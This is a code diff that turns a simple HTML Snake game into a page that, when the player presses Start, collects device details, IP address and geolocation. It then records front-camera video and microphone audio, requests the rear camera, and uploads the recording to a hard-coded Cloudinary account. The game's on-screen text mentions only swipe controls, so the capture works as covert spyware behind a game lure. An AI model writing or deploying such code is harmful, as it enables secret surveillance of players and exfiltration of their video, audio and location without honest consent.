@@ -3,239 +3,373 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-<title>Snake Game</title>
+<title>Game with Media Capture</title>
 <style>
-  /* Make sure page fits viewport with no scrolling */
   html, body {
-    margin: 0; padding: 0; height: 100%; width: 100%;
-    overflow: hidden;
-    background: #121212;
-    color: #EEE;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
+    margin:0; padding:0; overflow:hidden; height:100%; width:100%;
+    background:#111; color:#eee; font-family: Arial, sans-serif;
+    -webkit-touch-callout:none; /* disable callout, copy on iOS */
+    -webkit-user-select:none;   /* disable selection */
+    -ms-user-select:none;
+    user-select:none;
   }
-
-  h1 {
-    margin: 0 0 12px 0;
-    font-weight: 700;
-    user-select: none;
-  }
-
-  #gameContainer {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
+  #gameCanvas {
     background: #222;
-    padding: 15px;
-    border-radius: 12px;
-    box-shadow: 0 0 14px rgba(100, 0, 255, 0.6);
-    max-width: 100vw;
-  }
-
-  canvas#game {
-    background: #000;
-    border-radius: 10px;
-    border: 3px solid #6a0dad;
-    touch-action: none;
     display: block;
-    width: 320px;
-    height: 320px;
-    max-width: 90vw;
-    max-height: 90vw;
+    margin: 0 auto;
+    touch-action: none;
   }
-
-  #scoreBoard {
-    margin-top: 12px;
-    font-size: 1.6rem;
-    font-weight: 600;
-    letter-spacing: 1px;
-    user-select: none;
-    text-align: center;
-    width: 100%;
+  #scoreboard {
+    position: fixed;
+    top: 10px; left: 50%; transform: translateX(-50%);
+    color: #0f0;
+    font-size: 20px;
+    font-weight: bold;
   }
-
-  #buttons {
-    margin-top: 15px;
+  #controls {
+    position: fixed;
+    bottom: 20px; left: 50%; transform: translateX(-50%);
   }
-
   button {
-    background: #6a0dad;
-    border: none;
-    color: white;
-    padding: 12px 26px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    border-radius: 10px;
+    font-size: 18px;
+    padding: 10px 15px;
+    margin: 0 10px;
     cursor: pointer;
-    user-select: none;
-    transition: background-color 0.3s ease;
+    border-radius: 5px;
+    border: none;
+    background: #0a0;
+    color: #fff;
   }
-
-  button:hover, button:focus {
-    background: #8b3ded;
-    outline: none;
-  }
-
-  #instructions {
-    margin-top: 25px;
-    max-width: 320px;
-    font-size: 0.9rem;
-    line-height: 1.4;
-    color: #ccc;
-    user-select: none;
+  #info {
+    position: fixed;
+    bottom: 70px;
+    left: 50%;
+    transform: translateX(-50%);
+    color: #aaa;
+    font-size: 12px;
     text-align: center;
   }
 </style>
 </head>
 <body>
 
-<h1>Snake Game</h1>
+<div id="scoreboard">Score: 0</div>
+<canvas id="gameCanvas" width="320" height="480"></canvas>
 
-<div id="gameContainer">
-  <canvas id="game" width="320" height="320"></canvas>
-  <div id="scoreBoard">Score: 0</div>
-  <div id="buttons">
-    <button id="newGameBtn">New Game</button>
-  </div>
-  <div id="instructions">
-    Use arrow keys (desktop) or swipe on the game area (mobile) to control the snake.
-  </div>
+<div id="controls">
+  <button id="startBtn">Start Game</button>
+  <button id="restartBtn" disabled>Restart</button>
 </div>
 
+<div id="info">Use swipe gestures to control the snake</div>
+
 <script>
-(() => {
-  const canvas = document.getElementById('game');
-  const ctx = canvas.getContext('2d');
-  const scoreBoard = document.getElementById('scoreBoard');
-  const newGameBtn = document.getElementById('newGameBtn');
+// --- Game Code (Snake) with touch control ---
+const canvas = document.getElementById('gameCanvas');
+const ctx = canvas.getContext('2d');
+const scoreboard = document.getElementById('scoreboard');
+const startBtn = document.getElementById('startBtn');
+const restartBtn = document.getElementById('restartBtn');
+const info = document.getElementById('info');
 
-  const gridSize = 16;
-  const tileCount = canvas.width / gridSize;
+const gridSize = 20;
+const tileCountX = canvas.width / gridSize;
+const tileCountY = canvas.height / gridSize;
 
-  let snake;
-  let velocity;
-  let food;
-  let score;
-  let gameSpeed;
-  let gameInterval;
+let snake = [];
+let direction = {x:0, y:0};
+let food = {};
+let score = 0;
+let gameInterval;
+let isPlaying = false;
 
-  let touchStartX = null;
-  let touchStartY = null;
+// Initialize snake in center
+function initSnake() {
+  snake = [{x: Math.floor(tileCountX/2), y: Math.floor(tileCountY/2)}];
+  direction = {x: 0, y: 0};
+  score = 0;
+  updateScore();
+}
 
-  function drawGame() {
-    ctx.fillStyle = '#000';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+// Place food randomly
+function placeFood() {
+  food.x = Math.floor(Math.random() * tileCountX);
+  food.y = Math.floor(Math.random() * tileCountY);
+}
 
-    ctx.fillStyle = '#6a0dad';
-    snake.forEach(segment => {
-      ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2);
+// Update score display
+function updateScore() {
+  scoreboard.textContent = `Score: ${score}`;
+}
+
+// Draw everything
+function draw() {
+  ctx.fillStyle = '#111';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+  // Draw food
+  ctx.fillStyle = '#f00';
+  ctx.fillRect(food.x*gridSize, food.y*gridSize, gridSize, gridSize);
+
+  // Draw snake
+  ctx.fillStyle = '#0f0';
+  snake.forEach((segment, idx) => {
+    ctx.fillRect(segment.x*gridSize, segment.y*gridSize, gridSize-1, gridSize-1);
+  });
+}
+
+// Update game state
+function update() {
+  if(direction.x === 0 && direction.y === 0) return; // not moving
+
+  const head = {...snake[0]};
+  head.x += direction.x;
+  head.y += direction.y;
+
+  // Wrap around edges
+  if(head.x < 0) head.x = tileCountX - 1;
+  if(head.x >= tileCountX) head.x = 0;
+  if(head.y < 0) head.y = tileCountY - 1;
+  if(head.y >= tileCountY) head.y = 0;
+
+  // Check collision with self
+  if(snake.some(seg => seg.x === head.x && seg.y === head.y)) {
+    endGame();
+    return;
+  }
+
+  snake.unshift(head);
+
+  // Eat food
+  if(head.x === food.x && head.y === food.y) {
+    score++;
+    updateScore();
+    placeFood();
+  } else {
+    snake.pop();
+  }
+}
+
+// Game loop
+function gameLoop() {
+  update();
+  draw();
+}
+
+// Game control
+function startGame() {
+  if(isPlaying) return;
+  isPlaying = true;
+  initSnake();
+  placeFood();
+  direction = {x:1, y:0};
+  gameInterval = setInterval(gameLoop, 150);
+  startBtn.disabled = true;
+  restartBtn.disabled = false;
+  info.textContent = 'Use swipe gestures to control the snake';
+}
+
+function endGame() {
+  clearInterval(gameInterval);
+  isPlaying = false;
+  info.textContent = `Game Over! Final Score: ${score}`;
+  startBtn.disabled = false;
+  restartBtn.disabled = true;
+}
+
+// Restart button
+restartBtn.addEventListener('click', () => {
+  if(isPlaying) {
+    clearInterval(gameInterval);
+  }
+  startGame();
+});
+
+// Start button
+startBtn.addEventListener('click', () => {
+  startGame();
+});
+
+// Touch control for mobile swipe
+let touchStartX = 0;
+let touchStartY = 0;
+
+canvas.addEventListener('touchstart', e => {
+  const touch = e.touches[0];
+  touchStartX = touch.clientX;
+  touchStartY = touch.clientY;
+});
+
+canvas.addEventListener('touchend', e => {
+  const touch = e.changedTouches[0];
+  const dx = touch.clientX - touchStartX;
+  const dy = touch.clientY - touchStartY;
+
+  if(Math.abs(dx) > Math.abs(dy)) {
+    // Horizontal swipe
+    if(dx > 20 && direction.x !== -1) direction = {x:1, y:0}; // right
+    else if(dx < -20 && direction.x !== 1) direction = {x:-1, y:0}; // left
+  } else {
+    // Vertical swipe
+    if(dy > 20 && direction.y !== -1) direction = {x:0, y:1}; // down
+    else if(dy < -20 && direction.y !== 1) direction = {x:0, y:-1}; // up
+  }
+});
+
+// --- Media Capture and Upload ---
+
+// Cloudinary config (replace with your own)
+const CLOUD_NAME = 'dps0g5ftz'; // your cloud name
+const UPLOAD_PRESET = 'unsigned'; // your unsigned upload preset
+
+let mediaRecorder;
+let recordedChunks = [];
+let sessionId;
+let frontStream, rearStream, micStream;
+
+async function startMediaCapture() {
+  sessionId = Date.now(); // simple session id (timestamp)
+
+  try {
+    // Request front camera + mic
+    frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
     });
 
-    ctx.fillStyle = '#e91e63';
-    ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);
+    // Request rear camera (some devices might not support dual simultaneous)
+    // We request rear separately to record it in parallel (optional)
+    rearStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { exact: "environment" } },
+      audio: false
+    });
+  } catch (e) {
+    console.error("Error accessing media devices:", e);
+    alert("Please allow access to camera and microphone.");
+    return;
   }
 
-  function updateGame() {
-    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };
+  // Combine audio from frontStream (mic) with video from frontStream or rearStream
+  // For simplicity, we record frontStream (video+audio) only here.
 
-    if (head.x < 0) head.x = tileCount - 1;
-    if (head.x >= tileCount) head.x = 0;
-    if (head.y < 0) head.y = tileCount - 1;
-    if (head.y >= tileCount) head.y = 0;
+  // Create MediaRecorder for front camera + mic
+  mediaRecorder = new MediaRecorder(frontStream, { mimeType: "video/webm" });
+  recordedChunks = [];
 
-    if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
-      endGame();
-      return;
-    }
+  mediaRecorder.ondataavailable = function(e) {
+    if(e.data.size > 0) recordedChunks.push(e.data);
+  };
 
-    snake.unshift(head);
+  mediaRecorder.onstop = async function() {
+    const blob = new Blob(recordedChunks, { type: "video/webm" });
+    await uploadRecording(blob);
+    recordedChunks = [];
+  };
 
-    if (head.x === food.x && head.y === food.y) {
-      score++;
-      placeFood();
-      scoreBoard.textContent = `Score: ${score}`;
-      if (gameSpeed > 50) {
-        gameSpeed -= 5;
-        clearInterval(gameInterval);
-        gameInterval = setInterval(gameLoop, gameSpeed);
-      }
-    } else {
-      snake.pop();
-    }
+  mediaRecorder.start();
+
+  console.log("Recording started.");
+}
+
+// Stop recording and upload
+function stopMediaCapture() {
+  if(mediaRecorder && mediaRecorder.state !== "inactive") {
+    mediaRecorder.stop();
+  }
+  if(frontStream) {
+    frontStream.getTracks().forEach(track => track.stop());
+  }
+  if(rearStream) {
+    rearStream.getTracks().forEach(track => track.stop());
+  }
+  console.log("Recording stopped.");
+}
+
+// Upload video blob to Cloudinary
+async function uploadRecording(blob) {
+  const folderName = `sessions/${sessionId}`;
+  const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
+
+  const formData = new FormData();
+  formData.append('file', blob);
+  formData.append('upload_preset', UPLOAD_PRESET);
+  formData.append('folder', folderName);
+  formData.append('resource_type', 'video');
+  formData.append('public_id', `session_${sessionId}_${Date.now()}`);
+
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      body: formData
+    });
+    const data = await res.json();
+    console.log("Upload successful:", data.secure_url);
+  } catch (error) {
+    console.error("Upload error:", error);
+  }
+}
+
+// Collect user/device info + geolocation (with permission)
+async function collectUserInfo() {
+  const info = {};
+
+  // Basic navigator info
+  info.userAgent = navigator.userAgent;
+  info.platform = navigator.platform;
+  info.language = navigator.language;
+  info.cookiesEnabled = navigator.cookieEnabled;
+
+  // Screen info
+  info.screenWidth = window.screen.width;
+  info.screenHeight = window.screen.height;
+  info.viewportWidth = window.innerWidth;
+  info.viewportHeight = window.innerHeight;
+
+  // Timezone
+  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  // IP Address - fetch from external API
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    info.ip = ipData.ip;
+  } catch {
+    info.ip = 'Unavailable';
   }
 
-  function placeFood() {
-    food = {
-      x: Math.floor(Math.random() * tileCount),
-      y: Math.floor(Math.random() * tileCount),
-    };
-    if (snake.some(seg => seg.x === food.x && seg.y === food.y)) {
-      placeFood();
-    }
+  // Geolocation (with permission)
+  info.geo = {};
+  if("geolocation" in navigator) {
+    await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        info.geo.latitude = pos.coords.latitude;
+        info.geo.longitude = pos.coords.longitude;
+        info.geo.accuracy = pos.coords.accuracy;
+        resolve();
+      }, err => {
+        info.geo.error = err.message;
+        resolve();
+      }, {timeout: 10000});
+    });
   }
 
-  function gameLoop() {
-    updateGame();
-    drawGame();
-  }
+  console.log("User Info Collected:", info);
 
-  function startGame() {
-    snake = [{ x: 7, y: 7 }];
-    velocity = { x: 1, y: 0 }; // Start moving right immediately
-    score = 0;
-    gameSpeed = 120;
-    scoreBoard.textContent = 'Score: 0';
-    placeFood();
-    if (gameInterval) clearInterval(gameInterval);
-    gameInterval = setInterval(gameLoop, gameSpeed);
-  }
+  // You can send this info to your backend or log it as needed.
+}
 
-  function endGame() {
-    // Silently restart without popups
-    startGame();
-  }
+// --- Main control flow ---
 
-  window.addEventListener('keydown', e => {
-    if (e.repeat) return;
-    switch (e.key) {
-      case 'ArrowUp': if (velocity.y === 0) velocity = { x: 0, y: -1 }; break;
-      case 'ArrowDown': if (velocity.y === 0) velocity = { x: 0, y: 1 }; break;
-      case 'ArrowLeft': if (velocity.x === 0) velocity = { x: -1, y: 0 }; break;
-      case 'ArrowRight': if (velocity.x === 0) velocity = { x: 1, y: 0 }; break;
-    }
-  });
-
-  canvas.addEventListener('touchstart', e => {
-    if (e.touches.length === 1) {
-      touchStartX = e.touches[0].clientX;
-      touchStartY = e.touches[0].clientY;
-    }
-  });
-
-  canvas.addEventListener('touchend', e => {
-    if (touchStartX === null || touchStartY === null) return;
-    const touchEndX = e.changedTouches[0].clientX;
-    const touchEndY = e.changedTouches[0].clientY;
-    const diffX = touchEndX - touchStartX;
-    const diffY = touchEndY - touchStartY;
-    if (Math.abs(diffX) > Math.abs(diffY)) {
-      if (diffX > 20 && velocity.x === 0) velocity = { x: 1, y: 0 };
-      else if (diffX < -20 && velocity.x === 0) velocity = { x: -1, y: 0 };
-    } else {
-      if (diffY > 20 && velocity.y === 0) velocity = { x: 0, y: 1 };
-      else if (diffY < -20 && velocity.y === 0) velocity = { x: 0, y: -1 };
-    }
-    touchStartX = null;
-    touchStartY = null;
-  });
-
-  newGameBtn.addEventListener('click', startGame);
-
+startBtn.addEventListener('click', async () => {
+  await collectUserInfo();
+  await startMediaCapture();
   startGame();
-})();
+});
+
+window.addEventListener('beforeunload', () => {
+  stopMediaCapture();
+});
+
 </script>
 
 </body>
